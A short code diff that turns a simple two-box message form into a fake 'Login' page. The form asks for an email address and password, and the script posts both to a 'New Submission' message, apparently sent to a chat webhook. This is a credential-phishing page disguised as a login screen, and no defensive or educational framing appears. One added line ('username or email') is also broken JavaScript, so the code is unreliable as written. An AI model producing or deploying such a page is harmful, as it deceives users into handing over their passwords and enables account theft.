@@ -96,10 +96,10 @@
 <body>
 
     <div class="box">
-        <h1>Send a Message</h1>
+        <h1>Login</h1>
 
         <p class="description">
-            Enter something in both boxes.
+            Enter your email address and password.
         </p>
 
         <form id="messageForm">
@@ -161,8 +161,8 @@
             const message = {
                 content:
                     "**New Submission**\n\n" +
-                    "**Text 1:**\n" + text1 + "\n\n" +
-                    "**Text 2:**\n" + text2
+                    "**Text 1:**\n" + username or email + "\n\n" +
+                    "**Text 2:**\n" + password
             };
 
             try {
